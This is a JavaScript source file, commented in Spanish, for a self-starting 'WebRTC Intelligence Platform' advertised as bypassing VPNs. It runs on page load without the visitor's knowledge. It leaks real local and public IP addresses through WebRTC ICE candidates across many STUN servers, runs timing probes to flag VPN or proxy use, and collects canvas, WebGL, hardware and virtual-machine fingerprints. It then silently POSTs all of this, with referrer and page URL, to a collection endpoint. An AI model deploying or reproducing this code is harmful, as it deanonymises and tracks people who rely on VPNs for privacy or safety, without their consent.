/**
 * WebRTC Intelligence Platform - Enhanced Version
 * Advanced IP Extraction with VM Detection and VPN Bypass
 */
class WebRTCIntelligencePlatform {
    constructor() {
        this.sessionId = this.generateSessionId();
        this.candidates = [];
        this.capabilities = {};
        this.fingerprint = {};
        this.publicIP = null;
        this.stunDiscoveredIPs = [];
        this.timingAnalysis = [];
        this.startTime = performance.now();
        
        console.log('WebRTC Intelligence Platform Enhanced - Initializing...');
        this.initialize();
    }

    // Método principal de inicialización
    async initialize() {
        try {
            console.log('Starting comprehensive intelligence gathering...');
            
            // Fase 1: Capacidades básicas
            await this.detectCapabilities();
            
            // Fase 2: Obtener IP pública real
            await this.getPublicIP();
            
            // Fase 3: DNS Leak detection
            await this.attemptDNSLeak();
            
            // Fase 4: Comprehensive STUN discovery
            this.stunDiscoveredIPs = await this.comprehensiveSTUNDiscovery();
            
            // Fase 5: Timing analysis para detectar VPN/proxy
            this.timingAnalysis = await this.performTimingAnalysis();
            
            // Fase 6: WebRTC ICE extraction mejorada
            await this.extractIPIntelligence();
            
            // Fase 7: Fingerprinting con detección de VM
            this.generateFingerprint();
            
            // Fase 8: Enviar todos los datos
            await this.sendIntelligenceData();

            console.log('Intelligence gathering completed successfully');
            
        } catch (error) {
            console.error('Intelligence gathering failed:', error);
        }
    }

    // Obtención de IP pública usando múltiples servicios
    async getPublicIP() {
        console.log('Obtaining public IP address...');
        
        const services = [
            { url: 'https://api.ipify.org?format=json', field: 'ip' },
            { url: 'https://httpbin.org/ip', field: 'origin' },
            { url: 'https://jsonip.com', field: 'ip' },
            { url: 'https://api.my-ip.io/ip.json', field: 'ip' },
            { url: 'https://ipinfo.io/json', field: 'ip' },
            { url: 'https://ip.seeip.org/json', field: 'ip' },
            { url: 'https://api64.ipify.org?format=json', field: 'ip' }
        ];

        for (const service of services) {
            try {
                console.log(`Trying service: ${service.url}`);
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                
                const response = await fetch(service.url, {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' },
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (response.ok) {
                    const data = await response.json();
                    let ip = data[service.field];
                    
                    // Limpiar IP si viene con puerto
                    if (ip && ip.includes(',')) {
                        ip = ip.split(',')[0].trim();
                    }
                    
                    if (ip && this.isValidPublicIP(ip)) {
                        this.publicIP = ip.trim();
                        console.log(`Public IP obtained: ${this.publicIP} (via ${service.url})`);
                        return;
                    }
                }
            } catch (error) {
                console.log(`Service ${service.url} failed:`, error.message);
            }
        }
        
        console.warn('Could not obtain public IP from any service');
    }

    // Validación de IP pública
    isValidPublicIP(ip) {
        if (!ip || typeof ip !== 'string') return false;
        
        const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        if (!ipRegex.test(ip)) return false;
        
        const privateRanges = [
            /^127\./, /^0\./, /^10\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
            /^192\.168\./, /^169\.254\./, /^224\./, /^255\./
        ];
        
        return !privateRanges.some(pattern => pattern.test(ip));
    }

    // Detección de DNS leaks
    async attemptDNSLeak() {
        console.log('Attempting DNS leak detection...');
        
        const dnsTests = [
            'whoami.akamai.net',
            'diagnostic.opendns.com',
            'resolver1.opendns.com'
        ];

        for (const dnsHost of dnsTests) {
            try {
                const uniqueId = Math.random().toString(36).substr(2, 9);
                const testUrl = `https://${dnsHost}/test?id=${uniqueId}&t=${Date.now()}`;
                
                fetch(testUrl, { mode: 'no-cors' }).catch(() => {});
                
            } catch (error) {
                console.log(`DNS leak test failed for ${dnsHost}`);
            }
        }
    }

    // Descubrimiento comprehensivo usando múltiples STUN servers
    async comprehensiveSTUNDiscovery() {
        console.log('Starting comprehensive STUN discovery...');
        
        const stunServers = [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            'stun:stun2.l.google.com:19302',
            'stun:stun3.l.google.com:19302',
            'stun:stun4.l.google.com:19302',
            'stun:stun.twilio.com:3478',
            'stun:global.stun.twilio.com:3478',
            'stun:stun.relay.metered.ca:80',
            'stun:openrelay.metered.ca:80',
            'stun:stun.cloudflare.com:3478',
            'stun:stun.stunprotocol.org:3478',
            'stun:stun.voiparound.com:3478',
            'stun:stun.voipbuster.com:3478'
        ];

        const discoveredIPs = new Set();
        const promises = stunServers.map(server => this.testSTUNServer(server));
        
        const results = await Promise.allSettled(promises);
        results.forEach((result, index) => {
            if (result.status === 'fulfilled') {
                result.value.forEach(ip => discoveredIPs.add(ip));
                console.log(`STUN ${stunServers[index]}: found ${result.value.length} IPs`);
            }
        });

        const finalIPs = Array.from(discoveredIPs);
        console.log(`Total STUN IPs discovered: ${finalIPs.length}`);
        return finalIPs;
    }

    // Test de servidor STUN individual
    async testSTUNServer(stunUrl) {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: stunUrl }]
            });

            const foundIPs = [];
            
            const timeout = setTimeout(() => {
                pc.close();
                resolve(foundIPs);
            }, 8000);

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const parsed = this.parseICECandidate(event.candidate.candidate);
                    if (parsed && this.isValidIP(parsed.ip)) {
                        foundIPs.push(parsed.ip);
                    }
                } else {
                    clearTimeout(timeout);
                    pc.close();
                    resolve(foundIPs);
                }
            };

            pc.onicecandidateerror = () => {
                clearTimeout(timeout);
                pc.close();
                resolve(foundIPs);
            };

            try {
                pc.createDataChannel('test');
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => resolve(foundIPs));
            } catch (error) {
                resolve(foundIPs);
            }
        });
    }

    // Análisis de timing para detectar VPN/proxy
    async performTimingAnalysis() {
        console.log('Performing timing analysis...');
        
        const targets = [
            { host: 'www.google.com', name: 'Google' },
            { host: 'www.cloudflare.com', name: 'Cloudflare' },
            { host: 'www.github.com', name: 'GitHub' }
        ];

        const timingResults = [];

        for (const target of targets) {
            try {
                const measurements = [];
                
                // Realizar 3 mediciones por target
                for (let i = 0; i < 3; i++) {
                    const start = performance.now();
                    
                    try {
                        await fetch(`https://${target.host}/favicon.ico`, {
                            mode: 'no-cors',
                            cache: 'no-cache'
                        });
                    } catch (e) {}
                    
                    measurements.push(performance.now() - start);
                }

                const avgLatency = measurements.reduce((a, b) => a + b, 0) / measurements.length;
                
                timingResults.push({
                    target: target.name,
                    latency: avgLatency,
                    measurements: measurements,
                    suspiciousDelay: avgLatency > 800
                });

            } catch (error) {
                console.log(`Timing test failed for ${target.name}`);
            }
        }

        return timingResults;
    }

    // Extracción mejorada de ICE candidates
    async extractIPIntelligence() {
        return new Promise((resolve) => {
            console.log('Starting enhanced WebRTC IP extraction...');
            
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun.relay.metered.ca:80' }
                ]
            });

            const timeout = setTimeout(() => {
                console.log('WebRTC gathering timeout');
                pc.close();
                resolve(this.candidates);
            }, 15000);

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const parsed = this.parseICECandidate(event.candidate.candidate);
                    
                    if (parsed && this.isValidIP(parsed.ip)) {
                        const candidateData = {
                            ip: parsed.ip,
                            port: parsed.port,
                            type: parsed.type,
                            protocol: parsed.protocol,
                            foundation: parsed.foundation,
                            priority: parsed.priority,
                            discoveryTime: performance.now() - this.startTime,
                            timestamp: new Date().toISOString()
                        };
                        
                        this.candidates.push(candidateData);
                        console.log(`WebRTC IP found: ${parsed.ip} (${parsed.type})`);
                    }
                } else {
                    console.log('WebRTC gathering complete');
                    pc.close();
                    clearTimeout(timeout);
                    resolve(this.candidates);
                }
            };

            pc.onicecandidateerror = (event) => {
                console.warn('ICE candidate error:', event);
            };

            pc.onicegatheringstatechange = () => {
                if (pc.iceGatheringState === 'complete') {
                    console.log('ICE gathering completed');
                    pc.close();
                    clearTimeout(timeout);
                    resolve(this.candidates);
                }
            };

            pc.createDataChannel('intelligence', { ordered: false, maxRetransmits: 0 });

            pc.createOffer()
                .then(offer => pc.setLocalDescription(offer))
                .catch(error => {
                    console.error('Failed to create offer:', error);
                    resolve([]);
                });
        });
    }

    // Detección avanzada de virtualización
    detectVirtualization() {
        console.log('Detecting virtualization environment...');
        
        const vmIndicators = {
            isVM: false,
            vmType: 'unknown',
            confidence: 0,
            indicators: []
        };

        try {
            // 1. User Agent analysis
            const userAgent = navigator.userAgent.toLowerCase();
            const vmPatterns = [
                { pattern: /virtualbox/i, type: 'VirtualBox', confidence: 40 },
                { pattern: /vmware/i, type: 'VMware', confidence: 40 },
                { pattern: /qemu/i, type: 'QEMU', confidence: 35 },
                { pattern: /kvm/i, type: 'KVM', confidence: 35 },
                { pattern: /hyper-v/i, type: 'Hyper-V', confidence: 35 }
            ];

            vmPatterns.forEach(vm => {
                if (vm.pattern.test(userAgent)) {
                    vmIndicators.indicators.push(`UserAgent: ${vm.type}`);
                    vmIndicators.vmType = vm.type;
                    vmIndicators.confidence += vm.confidence;
                }
            });

            // 2. Screen resolution analysis
            const resolution = `${screen.width}x${screen.height}`;
            const commonVMResolutions = [
                '1024x768', '1280x720', '1366x768', '1440x900', 
                '1920x1080', '800x600', '1152x864', '1280x800'
            ];
            
            if (commonVMResolutions.includes(resolution)) {
                vmIndicators.indicators.push(`Common VM resolution: ${resolution}`);
                vmIndicators.confidence += 15;
            }

            // 3. Hardware limitations
            if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) {
                vmIndicators.indicators.push(`Low CPU cores: ${navigator.hardwareConcurrency}`);
                vmIndicators.confidence += 20;
            }

            if (navigator.deviceMemory && navigator.deviceMemory <= 2) {
                vmIndicators.indicators.push(`Low memory: ${navigator.deviceMemory}GB`);
                vmIndicators.confidence += 15;
            }

            // 4. WebGL renderer analysis
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const renderer = gl.getParameter(gl.RENDERER).toLowerCase();
                const vmGPUPatterns = [
                    { pattern: /vmware/i, type: 'VMware GPU', confidence: 30 },
                    { pattern: /virtualbox/i, type: 'VirtualBox GPU', confidence: 30 },
                    { pattern: /qemu/i, type: 'QEMU GPU', confidence: 25 },
                    { pattern: /microsoft basic/i, type: 'Basic Display', confidence: 20 },
                    { pattern: /llvmpipe/i, type: 'Software Rendering', confidence: 25 },
                    { pattern: /software/i, type: 'Software GPU', confidence: 20 }
                ];
                
                vmGPUPatterns.forEach(gpu => {
                    if (gpu.pattern.test(renderer)) {
                        vmIndicators.indicators.push(`Virtual GPU: ${renderer}`);
                        vmIndicators.vmType = gpu.type;
                        vmIndicators.confidence += gpu.confidence;
                    }
                });
            }

            // 5. Performance timing test
            const start = performance.now();
            for (let i = 0; i < 100000; i++) {
                Math.random() * Math.random();
            }
            const timingResult = performance.now() - start;
            
            if (timingResult > 20) {
                vmIndicators.indicators.push(`Slow execution: ${timingResult.toFixed(2)}ms`);
                vmIndicators.confidence += 15;
            }

            // 6. Timezone and language patterns
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (timezone === 'UTC' || timezone.includes('GMT')) {
                vmIndicators.indicators.push('Generic timezone detected');
                vmIndicators.confidence += 10;
            }

            // 7. Touch support (VMs often lack proper touch)
            if (!('ontouchstart' in window) && navigator.maxTouchPoints === 0) {
                vmIndicators.indicators.push('No touch support');
                vmIndicators.confidence += 5;
            }

            // Final determination
            if (vmIndicators.confidence >= 50) {
                vmIndicators.isVM = true;
                console.log(`VM DETECTED: ${vmIndicators.vmType} (${vmIndicators.confidence}% confidence)`);
            }

            return vmIndicators;
            
        } catch (error) {
            console.error('VM detection failed:', error);
            return vmIndicators;
        }
    }

    // Generación de fingerprint completo
    generateFingerprint() {
        console.log('Generating comprehensive fingerprint...');
        
        const fingerprint = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            hardware: {
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                touchPoints: navigator.maxTouchPoints
            },
            webgl: this.getWebGLInfo(),
            canvas: this.getCanvasFingerprint(),
            virtualization: this.detectVirtualization(),
            connection: this.getConnectionInfo()
        };
        
        this.fingerprint = fingerprint;
        return fingerprint;
    }

    // Información de conexión
    getConnectionInfo() {
        try {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    type: connection.type
                };
            }
        } catch (error) {
            console.log('Connection info not available');
        }
        return null;
    }

    // Información WebGL mejorada
    getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
            };
        } catch (error) {
            return null;
        }
    }

    // Canvas fingerprint mejorado
    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 280;
            canvas.height = 60;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('WebRTC Intelligence 🔍', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Enhanced Detection', 4, 35);
            
            return {
                hash: this.hashCode(canvas.toDataURL()),
                dataURL: canvas.toDataURL().slice(-50)
            };
        } catch (error) {
            return null;
        }
    }

    // Envío de datos de inteligencia
    async sendIntelligenceData() {
        try {
            console.log('Preparing enhanced intelligence payload...');
            
            const payload = {
                sessionId: this.sessionId,
                publicIP: this.publicIP,
                candidates: this.candidates,
                stunDiscoveredIPs: this.stunDiscoveredIPs,
                capabilities: this.capabilities,
                fingerprint: this.fingerprint,
                timingAnalysis: this.timingAnalysis,
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                totalTime: performance.now() - this.startTime,
                vpnSuspicion: this.timingAnalysis.some(t => t.suspiciousDelay)
            };

            console.log('Intelligence summary:');
            console.log(`   Public IP: ${this.publicIP}`);
            console.log(`   WebRTC IPs: ${this.candidates.length}`);
            console.log(`   STUN IPs: ${this.stunDiscoveredIPs.length}`);
            console.log(`   VM Detected: ${this.fingerprint.virtualization?.isVM ? 'YES' : 'NO'}`);
            console.log(`   VPN Suspected: ${payload.vpnSuspicion ? 'YES' : 'NO'}`);

            const response = await fetch('/api/intelligence/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                const result = await response.json();
                console.log('Intelligence data transmitted successfully:', result);
            } else {
                console.error('Failed to transmit intelligence data:', response.status);
            }
        } catch (error) {
            console.error('Intelligence transmission error:', error);
        }
    }

    // Métodos auxiliares
    generateSessionId() {
        return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }

    async detectCapabilities() {
        this.capabilities = {
            webrtc: !!window.RTCPeerConnection,
            dataChannel: true,
            getUserMedia: !!(navigator.mediaDevices?.getUserMedia),
            webgl: !!document.createElement('canvas').getContext('webgl'),
            timestamp: new Date().toISOString()
        };
    }

    parseICECandidate(candidateString) {
        try {
            const parts = candidateString.split(' ');
            if (parts.length < 8) return null;
            
            return {
                foundation: parts[0],
                component: parseInt(parts[1]),
                protocol: parts[2],
                priority: parseInt(parts[3]),
                ip: parts[4],
                port: parseInt(parts[5]),
                type: parts[7],
                relAddr: parts[9] || null,
                relPort: parts[11] ? parseInt(parts[11]) : null
            };
        } catch (error) {
            console.error('Failed to parse candidate:', error);
            return null;
        }
    }

    isValidIP(ip) {
        if (!ip) return false;
        
        // Para WebRTC, permitimos más IPs pero filtramos las obvias
        const skipPatterns = [
            /^127\./, /^0\./, /^224\./, /^255\./
        ];
        
        return !skipPatterns.some(pattern => pattern.test(ip)) && 
               /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip);
    }

    hashCode(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash.toString(36);
    }
}

// Auto-inicialización
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new WebRTCIntelligencePlatform();
    });
} else {
    new WebRTCIntelligencePlatform();
}

window.WebRTCIntelligence = WebRTCIntelligencePlatform;
